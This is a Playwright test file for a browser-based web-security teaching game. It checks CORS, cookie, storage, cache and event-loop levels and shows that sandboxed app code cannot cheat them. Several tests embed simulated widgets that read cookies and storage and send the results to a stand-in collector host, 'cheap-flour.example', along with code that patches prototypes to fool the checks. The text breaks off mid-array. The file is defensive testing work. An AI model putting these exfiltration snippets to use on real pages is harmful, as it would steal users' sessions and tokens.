import { expect, test } from '@playwright/test'
import { editedText, playWebSolution, reload, startWebLevel, webLevels } from '../shared/levels'
import type { DebugStep, PredictionFact, Probe, WebLevel } from '../shared/levels'
import { expected } from '../test/unit/levels/web/expected'
import { otherFixes } from '../test/unit/levels/web/fixes'
import { runCheck } from './helpers/sandbox'

// Every Web fundamentals level in a real browser (ADR 0009): the CORS model, the level's server.js in its worker and the
// app really do what the table in test/unit/levels/web/expected.ts says (the Network panel's rows, the server's access
// lines, the preflights' questions, the Console's words), so the predictions' answers, which the unit tests check
// against that table, are what the model does. Every goal but the prediction fails on a reload of the starting files,
// the solution (an answer, the edits, a reload) solves it, other real fixes pass and tempting non-fixes do not
// (test/unit/levels/web/fixes.ts), and an emptied or deleted server.js (or, in chapter 5, app.js: every file a solution
// changes) never solves. Chapter 5's levels also check the event loop's timeline: what each frame painted, every forced
// layout and every transition, the same in Chromium, Firefox and WebKit; chapter 6's levels what the screen reader said
// (focus, states, live regions), the same in the three. No dev server needed: the apps run in a blank page.

const run = (page: Parameters<typeof runCheck>[0], level: WebLevel, files: Readonly<Record<string, string>>, probes: readonly Probe[] = level.sandbox.probes) =>
  runCheck(page, files, probes, undefined, { web: level.sandbox.web, page: level.sandbox.page })

/** The files after a solution's edits. */
function solvedFiles(level: WebLevel): Record<string, string> {
  let files = level.setup().files
  for (const step of level.solution) {
    if (typeof step === 'object' && 'save' in step) files = { ...files, [step.save]: editedText(files, step) }
  }
  return files
}

test.describe('server.js going wrong runs into the worker\'s walls, never Grindstone\'s page', () => {
  const level = webLevels[0]!
  const files = (server: string) => ({ ...startWebLevel(level).state.files, 'server.js': server })
  const ROUTE = 'const app = require(\'express\')()\napp.get(\'/menu\', (req, res) => {\n'

  test('a route that loops forever is stopped by the watchdog: the request fails, the page goes on', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const started = Date.now()
    const result = await run(page, level, files(`${ROUTE}  while (true) {}\n})\n`))
    expect(result.observation.finished).toBe(true)
    expect(Date.now() - started).toBeLessThan(4500)
    expect(result.network).toEqual(['GET https://api.cornerbakery.shop/menu failed'])
    expect(result.entries.map(entry => entry.text)).toContain('GET https://api.cornerbakery.shop/menu net::ERR_EMPTY_RESPONSE')
    expect(result.serverOutput.map(line => line.text)[0]).toMatch(/^server\.js did not answer GET \/menu within 1 s/)
    // the page itself still runs its own code meanwhile
    expect(await page.evaluate(() => 1 + 1)).toBe(2)
  })

  test('a syntax error, a throw at the top and a throw in a route name their line in server.js', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const syntax = await run(page, level, files('const app = require(\'express\')()\n\napp.get(\'/menu\', (req, res) => {\n  res.json([)\n})\n'))
    const crash = syntax.serverOutput.find(line => line.level === 'error')!
    expect(crash.text).toMatch(/^server\.js crashed: SyntaxError/)
    expect(crash.line).toBe(4)
    expect(syntax.network).toEqual(['GET https://api.cornerbakery.shop/menu failed'])

    const top = await run(page, level, files('const app = require(\'express\')()\nconst cors = require(\'cors\')\n'))
    expect(top.serverOutput.map(line => [line.text, line.line])).toEqual([['server.js crashed: Error: Cannot find module \'cors\' (server.js:2)', 2]])

    const thrown = await run(page, level, files(`${ROUTE}  res.set('Access-Control-Allow-Origin', '*')\n  res.json(MENU.length)\n})\n`))
    // Express's error page keeps the headers set before the throw, so the page may read this 500
    expect(thrown.network).toEqual(['GET https://api.cornerbakery.shop/menu 500'])
    // the engine's own words (WebKit: "Can't find variable: MENU"), the line of server.js in every engine
    expect(thrown.serverOutput.map(line => [line.level, line.text.replace(/^(ReferenceError): .*/, '$1'), line.line])).toEqual([['error', 'ReferenceError', 4], ['access', 'GET /menu 500', null]])
  })

  test('a header value outside Latin-1 and a status no answer carries are 500s naming their line; a floating rejection is reported', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const coffee = await run(page, level, files(`${ROUTE}  res.set('Access-Control-Allow-Origin', '*')\n  res.set('X-Note', 'Fresh today ☕')\n  res.json([])\n})\n`))
    expect(coffee.network).toEqual(['GET https://api.cornerbakery.shop/menu 500'])
    expect(coffee.serverOutput.map(line => [line.text, line.line])).toEqual([['TypeError: Invalid character in header content ["X-Note"]', 4], ['GET /menu 500', null]])
    expect(coffee.observation.finished).toBe(true)

    const status = await run(page, level, files(`${ROUTE}  res.statusCode = 99\n  res.end()\n})\n`))
    expect(status.serverOutput.map(line => [line.text, line.line])).toEqual([['RangeError: Invalid status code: 99', 3], ['GET /menu 500', null]])

    const floating = await run(page, level, files(`${ROUTE}  Promise.reject(new Error('stock service down'))\n  res.set('Access-Control-Allow-Origin', '*')\n  res.json([])\n})\n`))
    expect(floating.network).toEqual(['GET https://api.cornerbakery.shop/menu 200'])
    expect(floating.serverOutput.map(line => [line.level, line.text, line.line])).toContainEqual(['error', 'Unhandled rejection: Error: stock service down', 3])
  })
})

test.describe('an app that changes the frame\'s built-ins can\'t change the browser\'s rules or server.js\'s answers', () => {
  const level = webLevels[0]!
  // added before 1.1's app runs its fetch: each, unguarded, would let the page read the menu without the server's yes
  const CHEATS: Record<string, string> = {
    'URL\'s origin getter (every request looks same-origin)': 'Object.defineProperty(URL.prototype, \'origin\', { configurable: true, get() { return \'https://cornerbakery.shop\' } })',
    'MessageEvent\'s data getter (an Allow-Origin added to server.js\'s answers)': 'const data = Object.getOwnPropertyDescriptor(MessageEvent.prototype, \'data\').get\nObject.defineProperty(MessageEvent.prototype, \'data\', { configurable: true, get() { const value = data.call(this); return value && value.t === \'res\' ? { ...value, headers: [...value.headers, [\'access-control-allow-origin\', \'*\']] } : value } })',
    'Worker\'s onmessage and addEventListener (the same, by the handler)': 'const wrap = handler => event => handler({ data: event.data && event.data.t === \'res\' ? { ...event.data, headers: [...event.data.headers, [\'access-control-allow-origin\', \'*\']] } : event.data, preventDefault() {} })\nconst set = Object.getOwnPropertyDescriptor(Worker.prototype, \'onmessage\').set\nObject.defineProperty(Worker.prototype, \'onmessage\', { configurable: true, set(handler) { set.call(this, wrap(handler)) } })\nconst add = EventTarget.prototype.addEventListener\nEventTarget.prototype.addEventListener = function (type, handler, options) { return add.call(this, type, this instanceof Worker && type === \'message\' ? wrap(handler) : handler, options) }'
  }
  for (const [name, cheat] of Object.entries(CHEATS)) {
    test(name, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const start = startWebLevel(level).state.files
      const files = { ...start, 'app.js': start['app.js']!.replace('const API =', `${cheat}\nconst API =`) }
      const result = await run(page, level, files)
      expect(result.observation.probes.menu, JSON.stringify(result.observation.errors.map(error => error.text))).toBe(0)
      expect(result.network).toEqual(['GET https://api.cornerbakery.shop/menu CORS error'])
    })
  }
})

for (const level of webLevels) {
  test(`${level.id}: does what its table says, and its solution works`, async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const table = expected[level.id]!
    const start = await run(page, level, startWebLevel(level).state.files)
    expect(start.observation.finished).toBe(true)
    expect(start.observation.probes).toEqual(table.start.probes)
    expect(start.observation.errors).toHaveLength(table.start.errors)
    expect(start.network).toEqual(table.start.network)
    expect(start.server).toEqual(table.start.server)
    expect(start.asks).toEqual(table.start.asks ?? [])
    // chapter 2 (the levels with the Application panel): the cookies each request carried, the jar at the end, what
    // was refused, what a script can read
    const cookies = level.sandbox.web?.application === true
    if (cookies) {
      expect(start.sent).toEqual(table.start.sent ?? [])
      expect(start.stored).toEqual(table.start.stored ?? [])
      expect(start.refused).toEqual(table.start.refused ?? [])
      expect(start.readable).toEqual(table.start.readable ?? [])
    }
    // chapter 3 (the levels with storage): what the page's origin keeps, and the thief's requests the Server panel shows
    const tokens = level.sandbox.web?.storage !== undefined
    if (tokens) {
      expect(start.storage).toEqual(table.start.storage ?? [])
      expect(start.replayed).toEqual(table.start.replayed ?? [])
    }
    // chapter 4 (the levels with a cache): what the CDN did with every request, in order
    const caching = level.sandbox.web?.cache !== undefined
    if (caching) expect(start.cdn).toEqual(table.start.cdn ?? [])
    // chapter 5 (the levels on the event loop): what each frame painted, every forced layout, every transition, in order
    const looping = level.sandbox.web?.loop !== undefined
    if (looping) {
      expect(start.painted).toEqual(table.start.painted ?? [])
      expect(start.forced).toEqual(table.start.forced ?? [])
      expect(start.animated).toEqual(table.start.animated ?? [])
    }
    // chapter 6 (the levels on the accessibility model): what the screen reader said before the probes, in order
    const accessible = level.sandbox.web?.a11y === true
    if (accessible) expect(start.heard).toEqual(table.start.heard ?? [])
    // chapter 7 (the levels with the page's security headers): the Referer every request carried
    const headers = level.sandbox.web?.security !== undefined
    if (headers) expect(start.referers).toEqual(table.start.referers ?? [])
    const lines = start.entries.map(entry => entry.text)
    // what the texts quote (in any order: requests sent together may be answered in any order; an order question
    // checks its own lines' order below)
    for (const text of table.start.says ?? []) expect(lines.some(line => line.startsWith(text)), `${text}\n\n${lines.join('\n')}`).toBe(true)
    // every prediction against this very run: the right option's fact holds, a wrong one's does not, lines in order
    const holds = (fact: PredictionFact) => {
      if ('row' in fact) return start.network.includes(fact.row)
      if ('server' in fact) return start.server.filter(line => line === fact.server).length >= (fact.times ?? 1)
      if ('cdn' in fact) return start.cdn.includes(fact.cdn)
      if ('asks' in fact) return start.asks.some(asked => asked.split(',').includes(fact.asks))
      if ('sent' in fact) return start.sent.includes(fact.sent)
      if ('stored' in fact) return start.stored.includes(fact.stored)
      if ('refused' in fact) return start.refused.includes(fact.refused)
      if ('readable' in fact) return start.readable.includes(fact.readable)
      if ('storage' in fact) return start.storage.includes(fact.storage)
      if ('replayed' in fact) return start.replayed.includes(fact.replayed)
      if ('painted' in fact) return start.painted.some(item => item.startsWith(fact.painted))
      if ('forced' in fact) return start.forced.includes(fact.forced)
      if ('layouts' in fact) return start.forced.length === fact.layouts
      if ('animated' in fact) return start.animated.includes(fact.animated)
      if ('heard' in fact) return start.heard.includes(fact.heard)
      if ('referer' in fact) return start.referers.includes(fact.referer)
      return lines.some(line => line.startsWith(fact.says))
    }
    /** Where an order question's line shows: the Console, or (chapter 6) the reader. */
    const placeOf = (fact: PredictionFact) => 'heard' in fact ? start.heard.indexOf(fact.heard) : lines.findIndex(line => line.startsWith((fact as { says: string }).says))
    for (const question of level.prediction.questions) {
      if (question.form === 'order') {
        const order = question.answer.map(id => placeOf(question.options.find(option => option.id === id)!.fact!))
        expect(order.every(index => index >= 0) && order.every((index, i) => i === 0 || index > order[i - 1]!), `${question.id}: ${order}`).toBe(true)
        continue
      }
      const right: readonly string[] = question.form === 'one' ? [question.answer] : question.answer
      for (const option of question.options) if (option.fact) expect(holds(option.fact), `${question.id} ${option.id}`).toBe(right.includes(option.id))
    }

    if (level.kind === 'practice') return
    // every goal but the prediction fails on the starting files, even with the prediction answered
    const predicted = { ...startWebLevel(level).state, predicted: table.answers }
    const failed = reload({ ...startWebLevel(level), state: predicted }, level, start.observation)
    expect(level.goals.filter(goal => goal.id !== 'predicted').some(goal => failed.session.goalsMet[goal.id])).toBe(false)

    const solved = await run(page, level, solvedFiles(level))
    expect(solved.observation.probes).toEqual(table.solved!.probes)
    expect(solved.observation.errors).toHaveLength(table.solved!.errors)
    expect(solved.network).toEqual(table.solved!.network)
    expect(solved.server).toEqual(table.solved!.server)
    if (cookies) {
      expect(solved.sent).toEqual(table.solved!.sent ?? [])
      expect(solved.stored).toEqual(table.solved!.stored ?? [])
    }
    if (tokens) {
      expect(solved.storage).toEqual(table.solved!.storage ?? [])
      expect(solved.replayed).toEqual(table.solved!.replayed ?? [])
    }
    if (caching) expect(solved.cdn).toEqual(table.solved!.cdn ?? [])
    if (headers) {
      expect(solved.referers).toEqual(table.solved!.referers ?? [])
      for (const text of table.solved!.says ?? []) expect(solved.entries.some(entry => entry.text.startsWith(text)), text).toBe(true)
    }
    if (looping) {
      expect(solved.painted).toEqual(table.solved!.painted ?? [])
      expect(solved.forced).toEqual(table.solved!.forced ?? [])
      expect(solved.animated).toEqual(table.solved!.animated ?? [])
    }
    if (accessible) expect(solved.heard).toEqual(table.solved!.heard ?? [])
    const results = await playWebSolution(level, files => run(page, level, files).then(result => result.observation))
    expect(results.at(-1)!.session.solved).toBe(true)

    // throwing away server.js, or any file the solution changes (emptied or deleted), is no fix
    const changed = new Set([...(level.sandbox.web?.server ? [level.sandbox.web.server] : []), ...level.solution.flatMap(step => typeof step === 'object' && 'save' in step ? [step.save] : [])])
    for (const path of changed) {
      for (const files of [{ ...startWebLevel(level).state.files, [path]: '' }, Object.fromEntries(Object.entries(startWebLevel(level).state.files).filter(([each]) => each !== path))]) {
        const observation = (await run(page, level, files)).observation
        const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: table.answers } }, level, observation).session
        expect(session.solved, `${level.id} without ${path}`).toBe(false)
      }
    }
  })

  for (const fix of otherFixes[level.id] ?? []) {
    test(`${level.id}: ${fix.solves ? 'also solved by' : 'not solved by'} ${fix.name}`, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      let files = startWebLevel(level).state.files
      for (const edit of fix.edits) files = { ...files, [edit.save]: editedText(files, edit as DebugStep & { save: string }) }
      // as a player gets it: chapter 7's servers draw their scripted values at random
      const result = await runCheck(page, files, level.sandbox.probes, undefined, { web: level.sandbox.web, page: level.sandbox.page, randomSeeds: true })
      const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
      expect(session.solved, JSON.stringify({ probes: result.observation.probes, errors: result.observation.errors.map(error => error.text), server: result.serverOutput.map(line => line.text) }, null, 2)).toBe(fix.solves)
    })
  }
}

test.describe('an app can\'t read an HttpOnly cookie or forge one outside the cookie rules through any frame API (chapter 2)', () => {
  const level = webLevels.find(each => each.id === 'web-08-script-reads-session')!
  // reviews.js replaced by a widget that tries every way in, once Lena is signed in, and sends all it found away
  const CHEAT = [
    'document.querySelector(\'#reviews-open\').addEventListener(\'click\', async () => {',
    '  const found = []',
    '  const tryIt = (name, read) => { try { found.push(`${name}=${String(read())}`) } catch (error) { found.push(`${name}=${error.name}`) } }',
    '  tryIt(\'cookie\', () => document.cookie)',
    '  tryIt(\'native getter\', () => Object.getOwnPropertyDescriptor(Document.prototype, \'cookie\').get.call(document))',
    '  tryIt(\'redefine\', () => Object.defineProperty(document, \'cookie\', { get: () => \'x\' }))',
    '  tryIt(\'hostname\', () => { Object.defineProperty(URL.prototype, \'hostname\', { configurable: true, get() { return \'api.cornerbakery.shop\' } }); return document.cookie })',
    '  tryIt(\'lower case\', () => { String.prototype.toLowerCase = function () { return \'api.cornerbakery.shop\' }; return document.cookie })',
    '  tryIt(\'forge for the API\', () => { document.cookie = \'session=forged; Domain=api.cornerbakery.shop\'; return document.cookie })',
    '  tryIt(\'forge HttpOnly\', () => { document.cookie = \'session=forged; HttpOnly; Domain=cornerbakery.shop\'; return document.cookie })',
    '  const login = await fetch(\'https://api.cornerbakery.shop/login\', { method: \'POST\', credentials: \'include\', headers: { Cookie: \'session=forged\' }, body: new URLSearchParams({ email: \'lena@example.com\', password: \'croissant-42\' }) })',
    '  found.push(\'set-cookie:\' + login.headers.get(\'set-cookie\'))',
    '  fetch(\'https://cheap-flour.example/collect?c=\' + encodeURIComponent(found.join(\'|\')), { mode: \'no-cors\' })',
    '})'
  ].join('\n')

  test('the session stays unread and unforged: nothing of it leaks, a replay is no session, a forged write is refused', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const files = { ...solvedFiles(level), 'reviews.js': CHEAT }
    const result = await run(page, level, files)
    expect(result.observation.probes, JSON.stringify(result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example')).map(entry => decodeURIComponent(entry.url)))).toMatchObject({ who: 'Signed in as Lena', leaked: 0, stolen: 401 })
    // the widget did run, and what it found reads as the rules say: document.cookie without the session, the browser's
    // own getter refused (the sealed frame), no second definition, no Set-Cookie for the page
    const sent = result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example/collect')).map(entry => decodeURIComponent(entry.url))
    expect(sent.length, JSON.stringify(result.observation.errors.map(error => error.text))).toBeGreaterThan(0)
    // (Chromium and Firefox throw SecurityError from the browser's own getter, WebKit gives an empty string)
    expect(sent[0]).toMatch(/cookie=theme=dark\|native getter=(SecurityError)?\|redefine=TypeError\|/)
    expect(sent[0]).toContain('set-cookie:null')
    // the forged writes were refused by the model; the server.js session is the one Lena got
    expect(result.refused).toEqual(expect.arrayContaining(['session']))
    expect(result.stored.filter(name => name === 'session')).toHaveLength(1)
    // a Cookie header set by the page is dropped (a forbidden header)
    expect(result.requests.filter(entry => entry.url.endsWith('/login')).every(entry => !entry.requestHeaders.some(([name, value]) => name === 'cookie' && value.includes('forged')))).toBe(true)
  })
})

test.describe('setters and getters the app puts on the prototypes change nothing the check measures, and read no HttpOnly cookie (chapter 2)', () => {
  const csrf = webLevels.find(each => each.id === 'web-07-order-from-elsewhere')!
  const widget = webLevels.find(each => each.id === 'web-08-script-reads-session')!
  const solvedBy = async (page: Parameters<typeof runCheck>[0], level: WebLevel, files: Record<string, string>) => {
    const result = await run(page, level, files)
    const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
    return { solved: session.solved, result }
  }
  // put first into a file of the app, so the setters are there before Lena signs in
  const before = (files: Record<string, string>, path: string, code: string) => ({ ...files, [path]: `${code}\n${files[path]!}` })

  test('2.2: a url setter on Object.prototype that sends the attacks elsewhere solves nothing', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const cheat = 'Object.defineProperty(Object.prototype, \'url\', { configurable: true, set(value) { Object.defineProperty(this, \'url\', { value: new URL(\'https://api.cornerbakery.shop/nowhere\'), writable: true, enumerable: true, configurable: true }) } })'
    const { solved, result } = await solvedBy(page, csrf, before(startWebLevel(csrf).state.files, 'app.js', cheat))
    expect(solved).toBe(false)
    expect(result.observation.probes).toMatchObject({ attack: 201, other: 201, lookalike: 201 })
  })

  test('2.3: setters on array indices that mark the session HttpOnly solve nothing', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const cheat = [
      'const mark = (value) => {',
      '  if (value && typeof value === \'object\' && value.name === \'session\') value.httpOnly = true',
      '  if (value && typeof value === \'object\' && value.cookie && value.cookie.name === \'session\') value.cookie.httpOnly = true',
      '}',
      'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, { configurable: true, set(value) { mark(value); Object.defineProperty(this, i, { value, writable: true, enumerable: true, configurable: true }) } })'
    ].join('\n')
    const { solved, result } = await solvedBy(page, widget, before(startWebLevel(widget).state.files, 'app.js', cheat))
    expect(solved).toBe(false)
    expect(result.observation.probes).toMatchObject({ stolen: 200 })
  })

  test('2.3 solved: a widget with setters on Array.prototype and Object.prototype reads nothing of the HttpOnly session', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const cheat = [
      'let seen = \'\'',
      'const grab = (value) => {',
      '  try {',
      '    if (typeof value === \'string\') seen += `|${value}`',
      '    else if (value && typeof value === \'object\') for (const key of [\'value\', \'cookie\', \'header\', \'line\']) { const found = Object.getOwnPropertyDescriptor(value, key); if (found && \'value\' in found) seen += `|${JSON.stringify(found.value)}` }',
      '  } catch (error) { /* keep going */ }',
      '}',
      // descriptors without a prototype: the cheat's own setter for `value` would break plain ones
      'const desc = fields => Object.assign(Object.create(null), fields)',
      'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, desc({ configurable: true, set(value) { grab(value); Object.defineProperty(this, i, desc({ value, writable: true, enumerable: true, configurable: true })) } }))',
      'for (const key of [\'cookie\', \'value\', \'name\', \'header\', \'line\', \'headers\']) Object.defineProperty(Object.prototype, key, desc({ configurable: true, set(value) { grab(value); Object.defineProperty(this, key, desc({ value, writable: true, enumerable: true, configurable: true })) } }))',
      'document.querySelector(\'#reviews-open\').addEventListener(\'click\', () => {',
      '  fetch(\'https://cheap-flour.example/collect?c=\' + encodeURIComponent(seen + \'|\' + document.cookie), { mode: \'no-cors\' })',
      '})'
    ].join('\n')
    const { solved, result } = await solvedBy(page, widget, { ...solvedFiles(widget), 'reviews.js': cheat })
    const sent = result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example/collect'))
    expect(sent.length, JSON.stringify(result.observation.errors.map(error => error.text))).toBeGreaterThan(0)
    expect(result.observation.probes).toMatchObject({ leaked: 0, stolen: 401 })
    expect(solved).toBe(true)
  })
})

test.describe('an app can\'t hide a token from the thief or read storage outside the model through any frame API (chapter 3)', () => {
  const level = webLevels.find(each => each.id === 'web-11-token-in-storage')!
  // put first into app.js of 3.1's starting files (the token in localStorage): each tries to keep the token where the
  // page can use it while the check's thief, or the Application panel, sees nothing; none may change what they see
  const CHEATS: Record<string, string> = {
    'Storage.prototype\'s members patched (the token hidden from every other caller)': [
      'const realGet = Storage.prototype.getItem',
      // only the page's own api() still gets it (its frame is on the stack)
      'Storage.prototype.getItem = function (key) { return key === \'token\' && !/\\bapi\\b/.test(new Error().stack) ? null : realGet.call(this, key) }',
      'Object.defineProperty(Storage.prototype, \'length\', { configurable: true, get() { return 0 } })'
    ].join('\n'),
    'setters on Array.prototype indices that drop every write': 'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, Object.assign(Object.create(null), { configurable: true, set() {} }))',
    'setters and getters on Object.prototype for the thief\'s fields': 'for (const key of [\'tokens\', \'cookies\', \'headerSets\', \'queries\', \'headers\', \'answer\', \'page\', \'value\', \'items\']) Object.defineProperty(Object.prototype, key, Object.assign(Object.create(null), { configurable: true, set() {}, get() { return [] } }))',
    'JSON, atob and btoa replaced': 'JSON.parse = () => ({}); JSON.stringify = () => \'{}\'; window.atob = () => \'\'; window.btoa = () => \'\'',
    'Reflect, Proxy and WeakMap replaced': 'Reflect.get = () => undefined; Reflect.ownKeys = () => []; Reflect.getOwnPropertyDescriptor = () => undefined; window.Proxy = function () { return {} }; WeakMap.prototype.get = () => undefined; WeakMap.prototype.set = function () { return this }',
    'window.localStorage redefined (it can\'t be)': 'try { Object.defineProperty(window, \'localStorage\', { value: { getItem: () => null, setItem() {} } }) } catch (error) { console.info(\'localStorage stays: \' + error.name) }'
  }
  for (const [name, cheat] of Object.entries(CHEATS)) {
    test(name, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const start = startWebLevel(level).state.files
      const files = { ...start, 'app.js': `${cheat}\n${start['app.js']!}` }
      const result = await run(page, level, files)
      expect(result.observation.probes, JSON.stringify(result.observation.errors.map(error => error.text))).toMatchObject({ who: 'Signed in as Lena', taken: 200 })
      expect(result.storage).toEqual(['local token'])
      const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
      expect(session.solved).toBe(false)
    })
  }

  test('3.1 solved: a widget that tries every frame API reads no session, and what it sends is no session to the thief', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const widget = [
      'document.querySelector(\'#reviews-open\').addEventListener(\'click\', () => {',
      '  const found = []',
      '  const tryIt = (name, read) => { try { found.push(`${name}=${String(read())}`) } catch (error) { found.push(`${name}=${error.name}`) } }',
      '  tryIt(\'local\', () => JSON.stringify(localStorage))',
      '  tryIt(\'session\', () => JSON.stringify(sessionStorage))',
      '  tryIt(\'cookie\', () => document.cookie)',
      '  tryIt(\'native\', () => { const own = Object.getOwnPropertyDescriptor(Window.prototype, \'localStorage\'); return own ? JSON.stringify(own.get.call(window)) : \'none\' })',
      '  tryIt(\'redefine\', () => Object.defineProperty(window, \'localStorage\', { value: {} }))',
      '  tryIt(\'foreign\', () => Storage.prototype.getItem.call({}, \'token\'))',
      '  tryIt(\'instance\', () => localStorage instanceof Storage)',
      '  fetch(\'https://cheap-flour.example/collect?s=\' + encodeURIComponent(found.join(\'|\')), { mode: \'no-cors\' })',
      '})'
    ].join('\n')
    let files = startWebLevel(level).state.files
    for (const step of level.solution) if (typeof step === 'object' && 'save' in step) files = { ...files, [step.save]: editedText(files, step) }
    const result = await run(page, level, { ...files, 'reviews.js': widget })
    expect(result.observation.probes).toMatchObject({ who: 'Signed in as Lena', own: 'Thanks! Your order is in.', taken: 401 })
    expect(result.replayed).toEqual(['GET https://api.cornerbakery.shop/account 401'])
    const sent = result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example/collect')).map(entry => decodeURIComponent(entry.url))
    expect(sent.length).toBeGreaterThan(0)
    // the page's storage is empty, the session is HttpOnly, the browser's own storage is out of reach (a SecurityError,
    // or none on the window), the model's can't be replaced or called on anything else, and it is a Storage
    expect(sent[0]).toMatch(/local=\{\}\|session=\{\}\|cookie=\|native=(SecurityError|none|.*)\|redefine=TypeError\|foreign=TypeError\|instance=true/)
    expect(sent[0]).not.toContain('eyJ')
  })
})

test.describe('an app can\'t change what the caches keep or what the CDN hands another customer through any frame API (chapter 4)', () => {
  const level = webLevels.find(each => each.id === 'web-18-someone-elses-account')!
  // put first into app.js of 4.3's starting files (Lena's account public at the CDN): each tries to make Sam's request,
  // or a guest's, look like their own while the CDN still hands out Lena's copy
  const CHEATS: Record<string, string> = {
    'JSON.parse and String\'s functions replaced': 'JSON.parse = () => ({ name: \'Sam\' }); String.prototype.toLowerCase = function () { return \'x\' }; String.prototype.indexOf = () => -1',
    'setters on Array.prototype indices that drop every write': 'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, Object.assign(Object.create(null), { configurable: true, set() {} }))',
    'setters and getters on Object.prototype for the caches\' fields': 'for (const key of [\'fresh\', \'stored\', \'vary\', \'varyValues\', \'hits\', \'by\', \'outcome\', \'fromCache\', \'notModified\', \'lookup\', \'any\', \'only\', \'store\']) Object.defineProperty(Object.prototype, key, Object.assign(Object.create(null), { configurable: true, set() {}, get() { return key === \'fresh\' ? false : undefined } }))',
    'Request\'s cache getter and Headers\' forEach replaced': 'Object.defineProperty(Request.prototype, \'cache\', { configurable: true, get() { return \'no-store\' } }); Headers.prototype.forEach = function () {}'
  }
  for (const [name, cheat] of Object.entries(CHEATS)) {
    test(name, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const start = startWebLevel(level).state.files
      const files = { ...start, 'app.js': `${cheat}\n${start['app.js']!}` }
      const result = await run(page, level, files)
      expect(result.observation.probes, JSON.stringify(result.observation.errors.map(error => error.text))).toMatchObject({ sam: 'Lena', anon: 200 })
      expect(result.cdn).toContain('Sam GET https://api.cornerbakery.shop/account HIT')
      const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
      expect(session.solved).toBe(false)
    })
  }
})

test('chapter 3: the page and server.js tell the scripted time, by every cheap way to the clock', async ({ page }) => {
  await page.setContent('<!doctype html><title>check</title>')
  const level = webLevels.find(each => each.id === 'web-13-token-never-expires')!
  const start = startWebLevel(level).state.files
  const tell = 'const seconds = value => Math.floor(value / 1000)\nconsole.info(\'times \' + [seconds(Date.now()), seconds(new Date().constructor.now()), seconds(performance.timeOrigin + performance.now()), new Intl.DateTimeFormat(\'en-GB\', { timeZone: \'UTC\', hour: \'2-digit\', minute: \'2-digit\' }).format(), new Intl.DateTimeFormat(\'en-GB\', { timeZone: \'UTC\', hour: \'2-digit\', minute: \'2-digit\' }).formatToParts().map(part => part.value).join(\'\')].join(\' \'))'
  const server = start['server.js']!.replace('// GET /account: who is signed in', 'console.log(\'server \' + [Math.floor(Date.now() / 1000), Math.floor(new Date().constructor.now() / 1000), new Intl.DateTimeFormat(\'en-GB\', { timeZone: \'UTC\', hour: \'2-digit\', minute: \'2-digit\' }).format()].join(\' \'))\n// GET /account: who is signed in')
  const result = await run(page, level, { ...start, 'app.js': `${tell}\n${start['app.js']!}`, 'server.js': server })
  const at = Math.floor(Date.UTC(2026, 10, 17, 9, 41) / 1000)
  expect(result.entries.map(entry => entry.text)).toContain(`times ${at} ${at} ${at} 09:41 09:41`)
  expect(result.serverOutput.map(line => line.text)).toContain(`server ${at} ${at} 09:41`)
})

test.describe('an app can\'t fake a painted frame, a fade, or hide a forced layout through any frame API (chapter 5)', () => {
  const solvedBy = async (page: Parameters<typeof runCheck>[0], level: WebLevel, files: Record<string, string>) => {
    const result = await run(page, level, files)
    const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
    return { solved: session.solved, result }
  }
  // put first into app.js of the starting files, before any of its own code
  const first = (level: WebLevel, code: string) => {
    const start = startWebLevel(level).state.files
    return { ...start, 'app.js': `${code}\n${start['app.js']!}` }
  }
  const quietly = (code: string) => `try { ${code} } catch (error) { console.info('refused: ' + error.name) }`
  const SETTERS = [
    'for (const key of [\'kind\', \'runAt\', \'seq\', \'cancelled\', \'length\', \'list\', \'index\', \'painted\', \'started\', \'changes\', \'start\', \'done\', \'stop\', \'immediate\', \'current\', \'handler\', \'removed\', \'target\', \'idle\']) Object.defineProperty(Object.prototype, key, Object.assign(Object.create(null), { configurable: true, set() {}, get() { return undefined } }))',
    'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, Object.assign(Object.create(null), { configurable: true, set() {} }))'
  ].join('\n')

  const spinner = webLevels.find(each => each.id === 'web-21-spinner')!
  const SPINNER_CHEATS: Record<string, string> = {
    'setters on the prototypes for the loop\'s fields': SETTERS,
    'the frame\'s and timers\' functions replaced by ones that run at once': 'window.requestAnimationFrame = callback => { callback(0); return 1 }\nwindow.setTimeout = callback => { callback(); return 1 }\nwindow.MessageChannel = function () { this.port1 = this.port2 = { postMessage() {}, set onmessage(fn) { fn() } } }',
    'the style and box readers patched to say "shown"': [
      'CSSStyleDeclaration.prototype.getPropertyValue = () => \'block\'',
      quietly('Object.defineProperty(Element.prototype, \'getBoundingClientRect\', { value: () => ({ width: 100, height: 100 }) })'),
